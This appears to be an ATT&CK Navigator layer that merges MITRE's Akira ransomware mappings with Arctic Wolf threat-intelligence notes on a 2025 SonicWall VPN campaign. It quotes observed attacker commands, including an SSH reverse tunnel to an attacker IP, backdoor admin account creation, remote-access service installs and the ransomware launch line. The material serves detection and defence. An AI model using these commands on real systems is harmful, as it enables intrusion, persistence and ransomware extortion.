name: Akira (G1024) — MITRE Base + Arctic Wolf CTI Merged
description: Aggregated ATT&CK Navigator layer for Akira ransomware (G1024). BLUE = MITRE ATT&CK base layer (G1024 v2.0, ATT&CK v18). ORANGE = new techniques observed in the Arctic Wolf Labs 'Smash and Grab' campaign analysis (Sep 2025, targeting SonicWall SSL VPNs via CVE-2024-40766). PURPLE = overlap where Arctic Wolf field observations validate existing MITRE G1024 mappings. The orange techniques represent net-new tradecraft not yet cataloged in the official MITRE G1024 profile, providing CTI-driven coverage expansion.

techniques.comment:
[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Threat actors targeted VM storage and DC filesystems for domain credentials. Veeam credential extraction included DPAPI secret decryption. AD data exfiltrated via wbadmin.exe.

[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]

--- MITRE ATT&CK G1024 (Akira) ---
[Akira](https://attack.mitre.org/groups/G1024) uses software such as Advanced IP Scanner and MASSCAN to identify remote hosts within victim networks.(Citation: Arctic Wolf Akira 2023)

--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---
AD computer enumeration: 'Get-ADComputer -Filter * -Property *' selecting Name, DNSHostName, IPv4Address, OperatingSystem. Also Advanced IP Scanner, SoftPerfect Network Scanner.

[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]

--- MITRE ATT&CK G1024 (Akira) ---
[Akira](https://attack.mitre.org/groups/G1024) has used RDP for lateral movement.(Citation: Cisco Akira Ransomware OCT 2024)

--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---
RDP was primary lateral movement tool. Event ID 4624 (logon type 10) observed post-discovery phase.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
SMBv2 session setup requests with Impacket signature. Hostnames: kali, WIN, DESKTOP-HPLM2TD, WINUTIL, etc. Failed (4625) and successful (4624) SMB logon type 3 events.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
SSH reverse tunnels: 'ssh -R 5555 root@170.130.165[.]42'. OpenSSH on 0.0.0.0. Cloudflared under C:\ProgramData\ssh for SSH access via Cloudflare Tunnel from domain controllers.

[MITRE ATT&CK G1024 — Akira Base]
[Akira](https://attack.mitre.org/groups/G1024) has used binary padding to obfuscate payloads.(Citation: Cisco Akira Ransomware OCT 2024)

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
quser command via WMIExec to identify logged-in users: 'cmd.exe /Q /c quser 1> \\Windows\\Temp\\RANDOM 2>&1'. Six-character randomized filename is WMIExec signature.

[MITRE ATT&CK G1024 — Akira Base]
[Akira](https://attack.mitre.org/groups/G1024) has used legitimate names and locations for files to evade defenses.(Citation: Cisco Akira Ransomware OCT 2024)

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Internal scanning < 5 min after VPN login. Ports: 135 (RPC), 137 (NetBIOS), 445 (SMB), 1433 (SQL). Tools: SoftPerfect Network Scanner, Advanced IP Scanner.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Impacket WMIExec usage — quser commands redirected to six-character randomized filenames: 'cmd.exe /Q /c quser 1> \\Windows\\Temp\\RANDOM 2>&1'.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Data exfiltrated via FileZilla SFTP, rclone, and SSH to VPS endpoints. Multiple exfiltration methods across different Akira affiliates.

[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]

--- MITRE ATT&CK G1024 (Akira) ---
[Akira](https://attack.mitre.org/groups/G1024) has used PowerShell scripts for credential harvesting and privilege escalation.(Citation: Cisco Akira Ransomware OCT 2024)


--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---
PowerShell used extensively: Get-ADUser/Get-ADComputer for AD enumeration, Invoke-WebRequest/WebClient for tool downloads (AnyDesk, cloudflared), custom scripts for Veeam credential extraction (MSSQL + PostgreSQL), New-NetFirewallRule for firewall modification.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
cmd.exe used for: net user/net localgroup (account creation), quser (WMIExec-style session discovery with randomized output filenames), sc create (service installation), SSH tunnel initiation.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
BloodHound for AD relationship/permission group enumeration. MemberOf attribute collected in Get-ADUser. ESX Admins group targeted. NetExec also used.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Windows Event Logs cleared as part of defense evasion phase before ransomware deployment.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Data staged via WinRAR with consistent CLI syntax across multiple compromised hosts. Only source/target drive letters varied.

[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]

--- MITRE ATT&CK G1024 (Akira) ---
[Akira](https://attack.mitre.org/groups/G1024) uses valid account information to remotely access victim networks, such as VPN credentials.(Citation: Secureworks GOLD SAHARA)(Citation: Arctic Wolf Akira 2023)(Citation: Cisco Akira Ransomware OCT 2024)


--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---
Credentials harvested via CVE-2024-40766 used to authenticate against patched devices. Repeated malicious SSL VPN logins on OTP MFA-enabled accounts. Evidence points to valid credentials rather than OTP config modification.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
AD user enumeration: 'Get-ADUser -Filter * -Properties *' outputting Enabled, Name, SamAccountName, MemberOf, PasswordLastSet, LastLogonDate. Also: nltest, dsquery, BloodHound, ldapdomaindump.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Newly created accounts elevated to local Administrators and domain ESX Admins groups. Used for lateral movement, exfiltration, and RMM tool installation.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Ingress tool transfer: AnyDesk via WebClient.DownloadFile, cloudflared via Invoke-WebRequest, SoftPerfect/Advanced IP Scanner to %Temp%, RustDesk via batch script. Also Start-BitsTransfer.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
SonicWall confirmed SonicOS < 7.3 susceptible to brute force against MFA credentials. Evenly spaced periodic logins across multiple accounts suggest automated authentication scripting.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
MFA bypass — threat actors authenticated against OTP MFA-enabled accounts. SonicWall confirmed OTP seeds could generate valid tokens. Google TIG uncovered related OTP seed theft on SonicWall SMA.

[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]

--- MITRE ATT&CK G1024 (Akira) ---
[Akira](https://attack.mitre.org/groups/G1024) uses compromised VPN accounts for initial access to victim networks.(Citation: Secureworks GOLD SAHARA)

--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---
Initial access via SonicWall SSL VPN logins from VPS hosting providers. Both local firewall accounts and LDAP-synchronized AD accounts targeted, including LDAP sync service accounts not intended for VPN access.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
SharpShares for network share enumeration: 'SharpShares.exe /ldap:all /filter:netlogon,ipc$,print$ /threads:1000 /outfile:C:\programdata\tb.txt'.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Local admin accounts created on Veeam backup servers and VM admin servers. Blending account names: 'sqlbackup', 'veean'. Commands: 'net user sqlbackup /add' + 'net localgroup administrators sqlbackup /add'.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Domain accounts created and elevated to 'ESX Admins' group for data exfil and RMM tool installation. Command: 'net group "ESX Admins" USERNAME /domain /add'.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
CVE-2024-40766 (improper access control) in SonicOS 5/6/7 on NSa and TZ series. Exploitation enabled abuse of admin functions such as configuration backup, creating credential theft opportunities.

[MITRE ATT&CK G1024 — Akira Base]
[Akira](https://attack.mitre.org/groups/G1024) has accessed and downloaded information stored in SharePoint instances as part of data gathering and exfiltration activity.(Citation: Secureworks GOLD SAHARA)

[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]

--- MITRE ATT&CK G1024 (Akira) ---
[Akira](https://attack.mitre.org/groups/G1024) uses legitimate utilities such as AnyDesk and PuTTy for maintaining remote access to victim environments.(Citation: Secureworks GOLD SAHARA)(Citation: Arctic Wolf Akira 2023)

--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---
Multiple RMM tools: AnyDesk downloaded via PowerShell to C:\ProgramData\AnyDesk.exe, TeamViewer installed, RustDesk installed via batch script and registered as Windows service with auto-start.

[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]

--- MITRE ATT&CK G1024 (Akira) ---
[Akira](https://attack.mitre.org/groups/G1024) uses the built-in [Nltest](https://attack.mitre.org/software/S0359) utility or tools such as [AdFind](https://attack.mitre.org/software/S0552) to enumerate Active Directory trusts in victim environments.(Citation: Arctic Wolf Akira 2023) 

--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---
ldapdomaindump for LDAP enumeration and domain trust discovery. nltest for domain controller enumeration and trust relationships.

[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]

--- MITRE ATT&CK G1024 (Akira) ---
[Akira](https://attack.mitre.org/groups/G1024) encrypts files in victim environments as part of ransomware operations.(Citation: BushidoToken Akira 2023)(Citation: CISA Akira Ransomware APR 2024)

--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---
Akira ransomware deployed: 'akira.exe -n=1 -p=D:\' and share lists '-s=share.txt'. Both Akira and Akira_v2 (Megazord/Rust-based) encryptors. Full kill chain: 55 min to 4 hours.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Volume Shadow Copies deleted via vssadmin.exe before ransomware deployment. Standard Akira pre-encryption recovery inhibition.

[MITRE ATT&CK G1024 — Akira Base]
[Akira](https://attack.mitre.org/groups/G1024) deletes administrator accounts in victim networks prior to encryption.(Citation: Secureworks GOLD SAHARA)

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
RustDesk registered as persistent service: 'sc create RustDesk binpath=... start= auto'. Cloudflared installed as service: 'cloudflared.exe service install TOKEN'.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Custom PowerShell script extracted encrypted creds from Veeam Backup & Replication (v11/v12), supporting MSSQL and PostgreSQL. Decrypted DPAPI secrets and Base64-encoded formats. Also: sqlcmd queried VeeamBackup.dbo.Credentials directly.

[MITRE ATT&CK G1024 — Akira Base]
[Akira](https://attack.mitre.org/groups/G1024) have used scripts to dump Kerberos authentication credentials.(Citation: Cisco Akira Ransomware OCT 2024)

[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]

--- MITRE ATT&CK G1024 (Akira) ---
[Akira](https://attack.mitre.org/groups/G1024) uses utilities such as WinRAR to archive data prior to exfiltration.(Citation: Secureworks GOLD SAHARA)

--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---
WinRAR with -v3g (3GB split archives). Files filtered by recency and business relevance: general folders = 6 months, HR/AP folders = up to 30 months of data.

[OVERLAP — MITRE G1024 Base + Arctic Wolf CTI]

--- MITRE ATT&CK G1024 (Akira) ---
[Akira](https://attack.mitre.org/groups/G1024) has disabled or modified security tools for defense evasion.(Citation: Cisco Akira Ransomware OCT 2024)

--- ARCTIC WOLF CTI (Sep 2025 — SonicWall Campaign) ---
EDR tools and Microsoft Defender disabled prior to ransomware deployment. Systematic defense impairment as pre-encryption preparation.

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
Host firewall modified: 'New-NetFirewallRule -Name sshd -DisplayName "OpenSSH Server (sshd)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22'. OpenSSH configured on 0.0.0.0.

[MITRE ATT&CK G1024 — Akira Base]
[Akira](https://attack.mitre.org/groups/G1024) will exfiltrate victim data using applications such as [Rclone](https://attack.mitre.org/software/S1040).(Citation: Secureworks GOLD SAHARA)

[Arctic Wolf CTI — Akira SonicWall Campaign, Sep 2025]
SSH reverse tunnels and Cloudflare Tunnels to bypass NAT for C2. Cloudflared ran from AD DCs, installed as persistent service. Automated PowerShell installation scripts observed.

[MITRE ATT&CK G1024 — Akira Base]
[Akira](https://attack.mitre.org/groups/G1024) engages in double-extortion ransomware, exfiltrating files then encrypting them, in order to prompt victims to pay a ransom.(Citation: BushidoToken Akira 2023)(Citation: CISA Akira Ransomware APR 2024)
